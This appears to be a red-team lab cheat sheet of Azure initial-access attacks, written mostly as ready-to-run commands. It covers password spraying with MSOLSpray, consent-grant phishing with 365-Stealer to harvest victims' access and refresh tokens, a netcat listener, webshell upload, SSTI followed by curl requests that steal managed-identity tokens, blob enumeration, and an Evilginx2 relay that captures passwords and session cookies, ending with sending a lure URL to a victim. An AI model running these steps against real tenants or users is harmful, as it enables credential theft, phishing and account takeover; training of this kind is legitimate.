# Initial access attacks

* [Password spraying](#Password-spraying)
* [Illicit Consent Grant phishing](#Illicit-Consent-Grant-phishing)
* [Insecure file upload](#Insecure-file-upload)
* [Server Side Template Injection](#Server-Side-Template-Injection)
* [OS Command injection](#OS-Command-injection)
* [Storage account](#Storage-account)
* [Phishing Evilginx2](#Phishing-Evilginx2)

## Password spraying

* <https://github.com/dafthack/MSOLSpray>

* <https://github.com/ustayready/fireprox>

```powershell
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList validemails.txt -Password <PASSWORD> -Verbose
```

### Find valid emails

* Explained in Recon or use the command below

```powershell
C:\Python27\python.exe o365creeper.py -f emails.txt -o validemails.txt
```

## Illicit Consent Grant phishing

### Create a application

* Login to the Azure portal and in the left menu go to 'Azure Active Directory' --> 'App registrations' and click 'new registration'

* Set a application name and choose 'Accounts in any organizational directory (Any Azure AD Directory - Multitenant'
* Use the URL of the student VM in the URI (<https://xx.xx.xx.xx/login/authorized>)
* In the left menu go to 'Certificates & Secrets' and create a new client secret and copy it.
* In the left menu go to 'API permissions' and add the 'user.read' and 'User.ReadBasic.All' for the Microsoft Graph.

#### Check if users are allowed to consent to apps

```powershell
Import-Module AzureADPreview.psd1

#Use another tenant account
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<USERNAME>", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole

#output should be
ManagePermissionGrantsForSelf.microsoft-user-default-legacy
```

#### Setup the 365-stealer

* Copy the 365-stealer directory to the xampp directory

* Edit the 365-stealer.py and edit the CLIENTID (client application id), REDIRECTEDURL and CLIENTSECRET (From the certificate)

#### Start the 365-stealer

```powershell
&"C:\Program Files\Python38\python.exe" C:\xampp\htdocs\365-Stealer\365-Stealer.py --run-app
```

#### Get the phishinglink

* Browse to <https://localhost> and click on readmore. Copy the link!

#### Enumerating applications to send the phishing link

* Edit the permutations.txt to add permutations such as career, hr, users, file and backup

```powershell
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
Invoke-EnumerateAzureSubDomains -Base <BASE> –Verbose
```

#### Get the access tokens

* Browse to <http://localhost:82/365-Stealer/yourvictims/>

* Click on the user and copy the access token from access_token.txt
* See the "Using Azure tokens" section

#### Get admin consent

* <https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent>

* Global Admin, Application Admin, or Cloud Application Administrator can all grant tenant wide application admin consent

```powershell
- In the left menu go to 'API permissions' and add the mail.read, notes.read.all, mailboxsettings.readwrite, files.readwrite.all, mail.send to Microsoft Graph.
- Refish the user to get a token with the extra permissions
```

#### Start a listener

```powershell
nc.exe -lvp 4444
```

#### Abuse the access token - Uploading word doc to OneDrive

```powershell
cd C:\xampp\htdocs\365-Stealer\

& 'C:\Program Files\Python38\python.exe' 365-Stealer.py --upload <PATH TO DOC> --token-path C:\xampp\htdocs\365-Stealer\yourVictims\<USER>\access_token.txt
```

#### Refresh all tokens

* Access token is valid for 1 hour, can't be revoked.

* Refresh token is valid for 90 days but can be revoked.

```powershell
python 365-Stealer.py --refresh-all
```

## Insecure file upload

* Upload a webshell to a insecure webapp

* If command execution is possible execute command ```env```
* if the app service contains environment variables IDENITY_HEADER and IDENTITY_ENDPOINT, it has a managed identity.
* Get access token from managed identity using another webshell. Upload studentxtoken.phtml

## Server Side Template Injection

* SSTI allows an attacker to abuse template syntax to inject payloads in a template that is executed on the server side.

* That is, we can get command execution on a server by abusing this.
* Find we webapp which is vulnerable, test with injectin a expression ```{{7*7}}``` and see if it gets evaluated.
* The way expression is evaluated means that, most probably, either PHP or Python is used for the web app. We may need to run some trial and error methods to find out the exact language and template framework.
* Use ```{{config.items()}}``` and see if it works.
* Check if a managed identity is assigned (Check for the env variables IDENTITY_HEADER and IDENTITY_ENDPOINT)
* If code execution is possible execute the following to get a ARM access token for the managed identity:

```powershell
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

* Request keyvault Access token

```powershell
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

* Request AADGraph token

```powershell
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

## OS Command injection

* In case of OS command injection, it is possible to run arbitrary operating  system commands on the server where requests are processed.

* This is usually due to insecure parsing of user input such as parameters, uploaded files and HTTP requests.

## Storage account

### Todo with new Tenant/Storage Account names

#### Enumerate Azureblobs

* add permutations to permutations.txt like common, backup, code in the misc directory.

```powershell
Import-Module ./Microburst.psm1
Invoke-EnumerateAzureBlobs -Base defcorp
```

* Access the URL's and see if any files are listed (Example <https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list>)

* Access the files by adding it to the url (Example <https://defcorpcommon.blob.core.windows.net/backup/blob_client.py>)
* Check for a SAS URL, if found then open the "Connect to Azure Storage", select "blobl container" and select 'Shared Access Signatur (SAS)' and paste the URL, displayname will fill automatically.

## Phishing Evilginx2

* <https://github.com/kgretzky/evilginx2>

* Evilginx acts as a relay/man-in-the-middle between the legit web page and the target user. The user always interacts with the legit website and Evilginx captures usernames, passwords and authentication cookies.

### Todo If Phishing is an Option

#### Start evilgix2

```powershell
evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
```

#### Configure the domain

```powershell
config domain studentx.corp
```

#### Set the IP for the evilginx server

```powershell
config ip xx.xx.xx.xx
```

#### Use the template for office365

```powershell
phishlets hostname o365 <DOMAIN>
```

#### Verify the DNS entries

```powershell
phishlets get-hosts o365
```

#### Copy the certificate and private key

0365.cr and 0365.key from ```C:\studentx\.evilginx\crt``` to ```C:\studentx\.evilginx\crt\login.studentx.corp```

#### Enable phishlets

```powershell
phislets enable 0365
```

#### Create the phishing URL (Tied to an ID)

```powershell
lures create 0365
```

#### Get the phishing URL

* Share the phishing URL with the victim

```powershell
lures get-url <ID>
```
